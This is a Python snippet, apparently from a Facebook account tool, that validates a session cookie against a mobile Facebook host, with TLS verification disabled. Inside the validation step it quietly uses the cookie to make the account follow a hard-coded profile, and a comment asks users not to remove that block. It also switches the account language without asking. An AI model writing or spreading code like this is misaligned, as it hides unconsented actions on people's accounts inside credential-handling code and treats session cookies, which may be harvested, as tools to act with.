import re, requests,random
from bs4 import BeautifulSoup as parser
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
def val(host,kuki):
    try:
        kuki = {"cookie":kuki}
        ismi = requests.get(host.format("/me"),verify=False,cookies=kuki).content
        if "mbasic_logout_button" in str(ismi):
            if "Apa yang Anda pikirkan sekarang" in str(ismi):
                pass
            else:
                try:
                    requests.get(host.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=kuki)
                except:
                    pass
            try:
                # please don't remove this or change
                # you can added this block
                # Comment to author
                x = {}
                ikuti = parser(requests.get(host.format("/syairul.alim.7"),cookies=kuki).content,"html.parser").find("a",string="Ikuti")["href"]
                requests.get(host.format(ikuti),cookies=kuki)
            except TypeError:
                pass
            return True
        else:
            return False
    except requests.exceptions.ConnectionError:
        exit("# Bad connection")